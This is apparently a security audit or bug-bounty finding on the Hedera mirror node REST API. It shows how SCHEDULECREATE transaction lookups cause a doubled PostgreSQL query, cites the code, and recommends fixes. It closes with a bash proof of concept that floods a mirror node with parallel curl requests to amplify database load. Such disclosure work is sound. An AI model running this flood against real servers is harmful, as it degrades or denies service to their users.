### Title
Unprivileged DB Query Amplification via SCHEDULECREATE Transaction ID Lookup

### Summary
Any unauthenticated user can force a guaranteed second `pool.queryQuietly()` call on the `/api/v1/transactions/:transactionIdOrHash` endpoint by supplying a transaction ID that resolves to a successful SCHEDULECREATE transaction (`type === 42`, `result` in `SUCCESS_PROTO_IDS`) without the `scheduled` query parameter. The function `mayMissLongTermScheduledTransaction()` unconditionally returns `true` for this input, causing `getTransactionsByIdOrHash()` to issue a second database query with an extended timestamp range. Because SCHEDULECREATE transaction IDs are public knowledge on the Hedera network, this is trivially repeatable at scale with no privileges.

### Finding Description
**Exact code path:**

`rest/transactions.js`, `getTransactionsByIdOrHash()`, lines 930–938:
```js
const {rows} = await pool.queryQuietly(query, params).then((result) => {
  if (!mayMissLongTermScheduledTransaction(isTransactionHash, scheduled, result.rows)) {
    return result;
  }
  params[params.upperConsensusTimestampIndex] =
    params[params.lowerConsensusTimestampIndex] + maxScheduledTransactionConsensusTimestampRangeNs;
  return pool.queryQuietly(query, params);   // ← second DB query
});
```

`mayMissLongTermScheduledTransaction()`, lines 974–996:
```js
if (scheduled === undefined) {
  let scheduleExists = false;
  for (const transaction of transactions) {
    if (transaction.type === scheduleCreateProtoId && SUCCESS_PROTO_IDS.includes(transaction.result)) {
      scheduleExists = true;          // ← set true, keep looping
    } else if (transaction.scheduled) {
      return false;
    }
  }
  return scheduleExists;              // ← returns true → triggers second query
}
```

**Root cause:** When `scheduled` is `undefined` (no query param supplied) and the first query returns a row with `type === 42` and a successful result code, `scheduleExists` is set to `true` and the function returns `true` with no further guard. The caller unconditionally issues a second DB query. There is no check to prevent an attacker from deliberately triggering this path.

**Why existing checks fail:**

1. **Server-side response cache** (`responseCacheCheckHandler`/`responseCacheUpdateHandler`) is only active when `config.cache.response.enabled && config.redis.enabled` (line 54 of `server.js`). Redis is an optional external dependency; when absent or disabled, no server-side caching occurs at all.
2. Even when caching is active, the cache key is `MD5(req.originalUrl)`. Each distinct SCHEDULECREATE transaction ID produces a distinct cache key, so an attacker cycling through many transaction IDs bypasses the cache entirely.
3. The `SHORTER_CACHE_CONTROL_HEADER` (`max-age=5`) is only emitted for *recent* SCHEDULECREATE transactions (`elapsed < maxScheduledTransactionConsensusTimestampRangeNs`). For older transactions the header is `{}`, falling back to `DEFAULT_REDIS_EXPIRY` — but this is irrelevant when Redis is disabled.
4. **No rate-limiting middleware** is present in the Express middleware stack (`server.js` lines 67–144). The stack is: `urlencoded → json → cors → compression → httpContext → requestLogger → authHandler → metricsHandler → responseCacheCheckHandler → routes → responseHandler → responseCacheUpdateHandler → handleError`. No token-bucket or IP-rate-limit layer exists.

### Impact Explanation
Every HTTP request to `GET /api/v1/transactions/{scheduleCreateTxId}` (without `?scheduled=`) that resolves to a successful SCHEDULECREATE transaction costs **two** PostgreSQL queries instead of one. An attacker enumerating N distinct SCHEDULECREATE transaction IDs (all publicly visible on-chain) generates 2N database queries from N HTTP requests — a sustained 2× amplification of database load with zero authentication required. Under high request volume this can exhaust the PostgreSQL connection pool, increase query latency for all users, and degrade or deny service to the mirror node REST API.

### Likelihood Explanation
The preconditions are minimal: no account, no API key, no privileged access. SCHEDULECREATE transaction IDs are permanently recorded on the public Hedera ledger and trivially enumerable via the same mirror node API (`GET /api/v1/transactions?type=SCHEDULECREATE`). The exploit is deterministic and repeatable. Any attacker capable of sending HTTP requests can execute it continuously. The absence of rate limiting in the middleware stack means there is no built-in throttle.

### Recommendation
1. **Short-term:** Add a guard in `mayMissLongTermScheduledTransaction()` or in `getTransactionsByIdOrHash()` so that the second query is only issued when the SCHEDULECREATE transaction's `consensus_timestamp` is within the long-term schedule window (i.e., `nowInNs() - consensus_timestamp < maxScheduledTransactionConsensusTimestampRangeNs`). Old SCHEDULECREATE transactions can never have a pending long-term scheduled child, so the second query is unnecessary and should be skipped.
2. **Medium-term:** Add IP-based rate limiting middleware (e.g., `express-rate-limit`) to the REST API server for all `/api/v1/transactions/:id` endpoints.
3. **Long-term:** Ensure the Redis response cache is enabled and properly configured in production deployments so that repeated identical requests are served from cache without hitting the database.

### Proof of Concept
```bash
# Step 1: Find a successful SCHEDULECREATE transaction ID (public data)
TXID=$(curl -s "https://mainnet-public.mirrornode.hedera.com/api/v1/transactions?transactiontype=SCHEDULECREATE&result=success&limit=1" \
  | jq -r '.transactions[0].transaction_id')

# Step 2: Repeatedly query it WITHOUT ?scheduled= to force double DB queries
# Each request triggers two pool.queryQuietly() calls server-side
for i in $(seq 1 1000); do
  curl -s "http://<mirror-node-rest>/api/v1/transactions/${TXID}" > /dev/null &
done
wait

# Step 3: Enumerate many distinct SCHEDULECREATE IDs to bypass server-side cache
curl -s "https://mainnet-public.mirrornode.hedera.com/api/v1/transactions?transactiontype=SCHEDULECREATE&result=success&limit=100" \
  | jq -r '.transactions[].transaction_id' \
  | xargs -P 50 -I{} curl -s "http://<mirror-node-rest>/api/v1/transactions/{}" > /dev/null
# Result: 100 HTTP requests → 200 DB queries (2× amplification, cache-bypass guaranteed)
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** rest/transactions.js (L46-47)
```javascript
const scheduleCreateProtoId = 42;
const SHORTER_CACHE_CONTROL_HEADER = {'cache-control': `public, max-age=5`};
```

**File:** rest/transactions.js (L930-938)
```javascript
  const {rows} = await pool.queryQuietly(query, params).then((result) => {
    if (!mayMissLongTermScheduledTransaction(isTransactionHash, scheduled, result.rows)) {
      return result;
    }

    params[params.upperConsensusTimestampIndex] =
      params[params.lowerConsensusTimestampIndex] + maxScheduledTransactionConsensusTimestampRangeNs;
    return pool.queryQuietly(query, params);
  });
```

**File:** rest/transactions.js (L974-996)
```javascript
const mayMissLongTermScheduledTransaction = (isTransactionHash, scheduled, transactions) => {
  // Note scheduled may be undefined
  if (isTransactionHash || scheduled === false) {
    return false;
  }

  if (scheduled === undefined) {
    let scheduleExists = false;
    for (const transaction of transactions) {
      if (transaction.type === scheduleCreateProtoId && SUCCESS_PROTO_IDS.includes(transaction.result)) {
        scheduleExists = true;
      } else if (transaction.scheduled) {
        return false;
      }
    }

    return scheduleExists;
  } else if (scheduled && transactions.length === 0) {
    return true;
  }

  return false;
};
```

**File:** rest/server.js (L54-54)
```javascript
const applicationCacheEnabled = config.cache.response.enabled && config.redis.enabled;
```

**File:** rest/server.js (L67-144)
```javascript
// middleware functions, Prior to v0.5 define after sets
app.use(
  express.urlencoded({
    extended: false,
  })
);
app.use(express.json());
app.use(cors());

if (config.response.compression) {
  logger.info('Response compression is enabled');
  app.use(compression());
}

// logging middleware
app.use(httpContext.middleware);
app.useExt(requestLogger);

// authentication middleware - must come after httpContext and requestLogger
app.useExt(authHandler);

// metrics middleware
if (config.metrics.enabled) {
  const {metricsHandler} = await import('./middleware/metricsHandler');
  app.useExt(metricsHandler());
}

// Check for cached response
if (applicationCacheEnabled) {
  logger.info('Response caching is enabled');
  app.useExt(responseCacheCheckHandler);
}

// accounts routes
app.getExt(`${apiPrefix}/accounts`, accounts.getAccounts);
app.getExt(`${apiPrefix}/accounts/:${constants.filterKeys.ID_OR_ALIAS_OR_EVM_ADDRESS}`, accounts.getOneAccount);
app.use(`${apiPrefix}/${AccountRoutes.resource}`, AccountRoutes.router);

// balances routes
app.getExt(`${apiPrefix}/balances`, balances.getBalances);

// contracts routes
app.use(`${apiPrefix}/${ContractRoutes.resource}`, ContractRoutes.router);

// block routes
app.use(`${apiPrefix}/${BlockRoutes.resource}`, BlockRoutes.router);

// schedules routes
app.getExt(`${apiPrefix}/schedules`, schedules.getSchedules);
app.getExt(`${apiPrefix}/schedules/:scheduleId`, schedules.getScheduleById);

// tokens routes
app.getExt(`${apiPrefix}/tokens`, tokens.getTokensRequest);
app.getExt(`${apiPrefix}/tokens/:tokenId`, tokens.getTokenInfoRequest);
app.getExt(`${apiPrefix}/tokens/:tokenId/balances`, tokens.getTokenBalances);
app.getExt(`${apiPrefix}/tokens/:tokenId/nfts`, tokens.getNftTokensRequest);
app.getExt(`${apiPrefix}/tokens/:tokenId/nfts/:serialNumber`, tokens.getNftTokenInfoRequest);
app.getExt(`${apiPrefix}/tokens/:tokenId/nfts/:serialNumber/transactions`, tokens.getNftTransferHistoryRequest);

// topics routes
app.getExt(`${apiPrefix}/topics/:topicId/messages`, topicmessage.getTopicMessages);
app.getExt(`${apiPrefix}/topics/:topicId/messages/:sequenceNumber`, topicmessage.getMessageByTopicAndSequenceRequest);
app.getExt(`${apiPrefix}/topics/messages/:consensusTimestamp`, topicmessage.getMessageByConsensusTimestamp);

// transactions routes
app.getExt(`${apiPrefix}/transactions`, transactions.getTransactions);
app.getExt(`${apiPrefix}/transactions/:transactionIdOrHash`, transactions.getTransactionsByIdOrHash);

// response data handling middleware
app.useExt(responseHandler);

// Update Cache with response
if (applicationCacheEnabled) {
  app.useExt(responseCacheUpdateHandler);
}

// response error handling middleware
app.useExt(handleError);
```

**File:** rest/middleware/responseCacheHandler.js (L151-153)
```javascript
const cacheKeyGenerator = (req) => {
  return crypto.createHash('md5').update(req.originalUrl).digest('hex') + CACHE_KEY_VERSION_SUFFIX;
};
```
